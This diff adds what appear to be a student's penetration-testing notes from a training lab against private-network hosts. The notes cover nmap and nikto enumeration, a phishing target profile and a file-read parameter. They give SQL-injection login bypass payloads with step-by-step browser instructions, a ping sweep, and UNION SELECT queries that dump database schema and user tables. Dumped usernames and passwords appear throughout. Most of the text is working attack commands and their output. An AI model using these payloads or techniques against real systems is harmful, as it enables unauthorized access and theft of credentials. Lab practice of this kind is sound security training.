@@ -1,0 +1,114 @@
+10.50.21.129 -- intial box do not ping just scan with nmap
+nmap --script=http-enum.nse 10.50.21.129
+22/tcp open  ssh
+80/tcp open  http
+| http-enum: 
+|   /login.php: Possible admin folder
+|   /login.html: Possible admin folder
+|   /img/
+
+nikto -h 10.50.21.129
+/scripts/
+
+went straight to website 
+
+phishing target :
+Charlie Chaplann
+CEO, Target Corp Inc
+Suite 112
+1607 Range Rd
+Tampa, FL 33601
+CChaplann@UniversalExports.com
+PublicAffairs@TargetCorp.com
+
+will read files i upload 
+http://10.50.21.129/getcareers.php?myfile=Executive_Assistant.html
+
+can upload here
+http://10.50.21.129/apply.html
+
+http://10.50.21.129/login.html 
+admin password gives welcome
+'OR 1 ='1
+'OR 1 ='1
+gives welcome aaron 
+http://10.50.21.129/login.html 
+go back -- you need to have these steps done before submiting the above sql
+-- right click : INSPECT ACCESIBILITY PROPERTIES
+in the menu that opens at the bottom :: go to network tab
+submit credentials / login
+click the POST input feild in the menu on the bottom
+that opens a new menu hit the REQUEST tab that opens in the new menu
+switch to RAW its a toggle icon
+copy the entire feild
+go to the URL paste it after a question mark
+1 (the original) http://10.50.33.78/login.php
+2 (add the question mark) http://10.50.33.78/login.php?
+3 (final) http://10.50.33.78/login.php?username=TOM%27+OR+1%3D%271&passwd=TOM%27+OR+1%3D%271
+test the new credentials
+
+[name] => user2 [pass] => RntyrfVfNER78 [name] => user3 [pass] => Obo4GURRnccyrf 
+[name] => Lee_Roth [pass] => anotherpassword4THEages ) 1
+====================================================================================================
+/scripts/
+#!/usr/bin/python3
+import os
+system_user=user2
+user_password=EaglesIsARE78
+##Developer note
+#script will eventually take above system user credentials and run automated services
+
+user2
+EaglesIsARE78
+
+cat /etc/hosts
+192.168.28.181 WebAp
+for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=0.981 ms
+64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=0.602 ms
+64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.129 ms
+p
+
+http://127.0.0.1:1113/pick.php?product=7%20UNION%20SELECT%201,2,3
+1 	3 	$2
+
+UNION SELECT table_schema,table_name,column_name from information_schema.columns # 
+
+
+siteusers 	id 	$customer
+siteusers 	name 	$customer
+siteusers 	account 	$customer
+siteusers 	category 	$customer
+siteusers 	description 	$customer
+1 	123558 	$Lockheed Martin
+2 	14744 	$Boeing
+3 	117 	$General Dynamics
+4 	33699 	$Northrop Grumman
+5 	55487 	$ManTech International
+
+
+
+siteusers 	id 	$purchase_history
+siteusers 	quantity 	$purchase_history
+siteusers 	product 	$purchase_history
+siteusers 	account 	$purchase_history
+siteusers 	id 	$shippingdates
+siteusers 	ordernumber 	$shippingdates
+siteusers 	account 	$shippingdates
+siteusers 	date 	$shippingdates
+
+siteusers 	user_id 	$users
+siteusers 	name 	$users
+siteusers 	username 	$users
+
+Aaron 	Aaron 	$1
+user2 	user2 	$2
+user3 	user3 	$3
+Lee_Roth 	Lroth 	$4
+Aaron 	ncnffjbeqlCn$$jbeq 	$1 apasswordyPa$$word
+user2 	RntyrfVfNER78 	$2 EaglesIsARE78
+user3 	Obo4GURRnccyrf 	$3 Bob4THEEapples
+Lroth 	anotherpassword4THEages 	$4
+
+
+192.168.28.179
